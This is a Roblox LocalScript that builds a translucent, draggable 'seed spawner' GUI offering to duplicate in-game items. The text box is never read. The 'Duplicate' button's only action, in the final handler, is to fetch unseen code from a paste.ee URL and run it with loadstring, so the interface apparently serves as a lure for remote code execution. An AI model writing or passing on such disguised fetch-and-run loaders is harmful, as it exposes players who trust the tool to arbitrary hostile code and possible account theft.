-- Place this LocalScript in StarterGui

local player = game.Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SeedSpawnerGUI"
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

local guiWidth, guiHeight = 270, 180 -- 1/4 of typical phone screen

-- Main Frame (Translucent)
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, guiWidth, 0, guiHeight)
mainFrame.Position = UDim2.new(0.05, 0, 0.1, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
mainFrame.BackgroundTransparency = 0.3
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui
mainFrame.Active = true

-- Hide Button (Top Right)
local hideButton = Instance.new("TextButton")
hideButton.Text = "⨉"
hideButton.Size = UDim2.new(0, 32, 0, 32)
hideButton.Position = UDim2.new(1, -36, 0, 4)
hideButton.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
hideButton.BackgroundTransparency = 0.2
hideButton.TextColor3 = Color3.fromRGB(255, 255, 255)
hideButton.Font = Enum.Font.GothamBold
hideButton.TextSize = 20
hideButton.Parent = mainFrame
hideButton.ZIndex = 2

-- Show Button (hidden by default)
local showButton = Instance.new("TextButton")
showButton.Text = "Show"
showButton.Size = UDim2.new(0, 60, 0, 32)
showButton.Position = UDim2.new(0, 10, 0, 10)
showButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
showButton.BackgroundTransparency = 0.2
showButton.TextColor3 = Color3.fromRGB(255, 255, 255)
showButton.Font = Enum.Font.GothamBold
showButton.TextSize = 18
showButton.Parent = screenGui
showButton.Visible = false
showButton.ZIndex = 3

-- Title Label
local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "seed spawner"
titleLabel.Size = UDim2.new(1, 0, 0, 40)
titleLabel.BackgroundTransparency = 1
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 28
titleLabel.Parent = mainFrame

-- Text Box
local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(0.9, 0, 0, 40)
textBox.Position = UDim2.new(0.05, 0, 0, 50)
textBox.PlaceholderText = "Enter text here"
textBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
textBox.BackgroundTransparency = 0.3
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.Font = Enum.Font.Gotham
textBox.TextSize = 20
textBox.Parent = mainFrame

-- Duplicate Button
local button = Instance.new("TextButton")
button.Text = "Duplicate"
button.Size = UDim2.new(0.9, 0, 0, 40)
button.Position = UDim2.new(0.05, 0, 0, 100)
button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
button.BackgroundTransparency = 0.3
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.Font = Enum.Font.GothamBold
button.TextSize = 22
button.Parent = mainFrame

-- Draggable Logic (Safe)
local UserInputService = game:GetService("UserInputService")
local dragging = false
local dragStart = nil
local startPos = nil

mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        -- Don't drag if clicking on a button or textbox
        local guiObject = input.Target
        if guiObject ~= textBox and guiObject ~= button and guiObject ~= hideButton then
            dragging = true
            dragStart = Vector2.new(input.Position.X, input.Position.Y)
            startPos = mainFrame.Position
        end
    end
end)

mainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = Vector2.new(input.Position.X, input.Position.Y) - dragStart
        mainFrame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

-- Hide/Show Logic
hideButton.MouseButton1Click:Connect(function()
    mainFrame.Visible = false
    showButton.Visible = true
end)

showButton.MouseButton1Click:Connect(function()
    mainFrame.Visible = true
    showButton.Visible = false
end)

-- Button click event to execute the script
button.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://paste.ee/r/SrzUwpex"))()
end)
